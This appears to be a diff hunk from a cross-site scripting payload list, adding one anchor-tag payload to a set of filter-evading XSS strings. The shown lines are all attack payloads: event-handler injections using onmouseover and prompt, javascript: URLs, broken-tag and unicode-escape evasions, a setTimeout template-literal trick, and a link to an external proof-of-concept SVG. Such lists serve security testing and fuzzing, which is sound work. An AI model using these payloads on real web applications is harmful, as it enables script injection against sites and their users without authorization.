@@ -7,6 +7,7 @@ xss"'><embed/src=javascript:alert(document.domain)>
 m"onmouseover="prompt(-11)
 n'onmouseover='prompt(-12)
 <</div>script</div>>alert()<</div>/script</div>>
+<a href=prompt()>CLICK ME!</a>
 <? #a="><style/onload=\u0061lert`1`>">
 http://brutelogic.com.br/poc.svg
 '-setTimeout`prompt\u0028document.domain\u0029`-'
